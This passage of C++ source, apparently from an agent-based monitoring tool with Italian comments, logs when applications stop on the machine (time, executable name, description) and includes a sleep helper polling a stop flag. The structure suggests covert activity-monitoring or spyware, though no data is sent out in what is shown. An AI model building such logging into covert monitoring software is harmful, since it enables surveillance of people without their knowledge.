					if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
						bEmpty = FALSE;

					// 2. Poi il nome del file
					log.WriteLog((BYTE *)(*iterOld).pe.szExeFile, WideLen((*iterOld).pe.szExeFile));
					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 3. Quindi lo stato (START o STOP)
					log.WriteLog((BYTE *)L"STOP", WideLen(L"STOP"));
					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 4. La descrizione (se disponibile)
					wDesc = processObj->GetProcessDescription((*iterOld).pe.th32ProcessID);

					if (wDesc.empty() == FALSE)
						log.WriteLog((BYTE *)wDesc.c_str(), wDesc.size() * sizeof(WCHAR));

					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 5. Ed il delimitatore
					UINT delimiter = LOG_DELIMITER;
					log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));
				}
			}
		} while(0);

		if (AgentSleep(MyID, 3 * 1000)) {
			pProcessList.clear();
			pUpdatedProcess.clear();

			log.CloseLog(bEmpty);

			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - ApplicationAgent clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - ApplicationAgent clean stop\n", 5, FALSE);
	return 0;
}

BOOL AgentSleep(UINT Id, UINT uMillisec) {
	UINT uLoops;
	UINT uSleepTime = 1000; // Step di 1000ms

	Status *statusObj = Status::self();

	if (statusObj == NULL)
		return FALSE;

	if (uMillisec <= uSleepTime) {
		Sleep(uMillisec);
		
		if (statusObj->AgentQueryStop(Id))
			return TRUE;
		
		return FALSE;
	} else {
		uLoops = uMillisec / uSleepTime;
	}

	while (uLoops) {
		Sleep(uSleepTime);
		uLoops--;

		if (statusObj->AgentQueryStop(Id))
			return TRUE;
	}

	return FALSE;
}

void FAR PASCAL lineCallbackFunc(DWORD hDevice, DWORD dwMsg, DWORD dwCallbackInstance, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3) {

}